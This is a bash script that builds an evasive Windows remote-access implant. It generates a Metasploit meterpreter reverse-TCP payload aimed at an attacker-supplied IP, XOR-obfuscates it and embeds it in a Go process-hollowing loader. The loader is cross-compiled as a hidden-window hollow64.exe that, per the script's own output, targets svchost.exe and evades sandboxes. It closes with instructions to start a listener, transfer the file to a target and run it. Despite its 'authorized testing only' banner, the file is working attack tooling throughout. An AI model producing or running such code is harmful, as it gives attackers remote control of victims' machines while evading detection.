#!/bin/bash

echo "========================================"
echo "  Custom hollow64.exe Compiler"
echo "  FOR AUTHORIZED TESTING ONLY"
echo "========================================"
echo

# Check for msfvenom
if ! command -v msfvenom &> /dev/null; then
    echo "[!] msfvenom not found. Install Metasploit Framework"
    exit 1
fi

# Check for Go
if ! command -v go &> /dev/null; then
    echo "[!] Go compiler not found"
    echo "[!] Install from: https://golang.org/dl/"
    exit 1
fi

# Get user input
echo "[+] Enter configuration:"
echo
read -p "LHOST (attacker IP): " LHOST
read -p "LPORT (listener port, default 443): " LPORT

LPORT=${LPORT:-443}

echo
echo "[+] Configuration:"
echo "    LHOST: $LHOST"
echo "    LPORT: $LPORT"
echo
read -p "Confirm? (Y/N): " CONFIRM

if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
    echo "[!] Cancelled"
    exit 1
fi

echo
echo "[+] Generating meterpreter payload..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=$LHOST \
    LPORT=$LPORT \
    EXITFUNC=thread \
    -f raw \
    -o payload_temp.bin 2>/dev/null

if [ $? -ne 0 ]; then
    echo "[-] Failed to generate payload"
    exit 1
fi

echo "[+] Payload generated ($LHOST:$LPORT)"

# XOR encrypt the payload
echo "[+] Encrypting payload with XOR (key: 0xAA)..."
python3 << EOF
with open('payload_temp.bin', 'rb') as f:
    payload = f.read()

encrypted = bytes([b ^ 0xAA for b in payload])

with open('payload_encrypted.bin', 'wb') as f:
    f.write(encrypted)
EOF

if [ $? -ne 0 ]; then
    echo "[-] Failed to encrypt payload"
    rm -f payload_temp.bin
    exit 1
fi

echo "[+] Payload encrypted"

# Convert to Go byte array format
echo "[+] Converting to Go format..."
python3 << 'EOF'
with open('payload_encrypted.bin', 'rb') as f:
    encrypted = f.read()

hex_bytes = ', '.join([f'0x{b:02x}' for b in encrypted])

with open('payload_hex.txt', 'w') as f:
    f.write(hex_bytes)
EOF

if [ $? -ne 0 ]; then
    echo "[-] Failed to convert payload"
    rm -f payload_temp.bin payload_encrypted.bin
    exit 1
fi

PAYLOAD_HEX=$(cat payload_hex.txt)

# Create the actual Go file from template
echo "[+] Creating hollow64.go with embedded payload..."
sed "s/PAYLOAD_BYTES/$PAYLOAD_HEX/g" hollow64_template.go > hollow64.go

if [ $? -ne 0 ]; then
    echo "[-] Failed to create hollow64.go"
    rm -f payload_temp.bin payload_encrypted.bin payload_hex.txt
    exit 1
fi

echo "[+] hollow64.go created"

# Compile for Windows x64
echo "[+] Compiling hollow64.exe (cross-compile for Windows)..."
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o hollow64.exe hollow64.go

if [ $? -ne 0 ]; then
    echo "[-] Compilation failed"
    rm -f payload_temp.bin payload_encrypted.bin payload_hex.txt hollow64.go
    exit 1
fi

# Cleanup
echo "[+] Cleaning up temporary files..."
rm -f payload_temp.bin payload_encrypted.bin payload_hex.txt

echo
echo "========================================"
echo "  SUCCESS!"
echo "========================================"
echo
echo "  hollow64.exe compiled successfully!"
echo
echo "  Configuration:"
echo "  - LHOST: $LHOST"
echo "  - LPORT: $LPORT"
echo "  - Target: svchost.exe"
echo "  - Evasion: Sandbox detection, timing, RW->RX"
echo
echo "  Next steps:"
echo "  1. Start Metasploit listener:"
echo "     msfconsole -q"
echo "     use exploit/multi/handler"
echo "     set payload windows/x64/meterpreter/reverse_tcp"
echo "     set LHOST $LHOST"
echo "     set LPORT $LPORT"
echo "     exploit -j"
echo
echo "  2. Transfer hollow64.exe to target"
echo "  3. Execute: hollow64.exe"
echo
echo "  File size: $(stat -f%z hollow64.exe 2>/dev/null || stat -c%s hollow64.exe) bytes"
echo
echo "========================================"
